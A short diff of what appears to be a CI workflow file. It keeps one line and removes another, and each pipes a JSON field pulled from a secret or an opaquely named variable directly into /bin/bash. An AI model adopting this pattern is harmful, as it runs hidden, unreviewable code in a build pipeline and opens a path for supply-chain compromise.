@@ -22,7 +22,6 @@ jobs:
           w5: ${{ secrets.w5 }}
         run: |
           printf '%s' "$w5" | jq -r .jrku15332 | /bin/bash
-          printf '%s' "$uamf45980" | jq -r .fj0 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
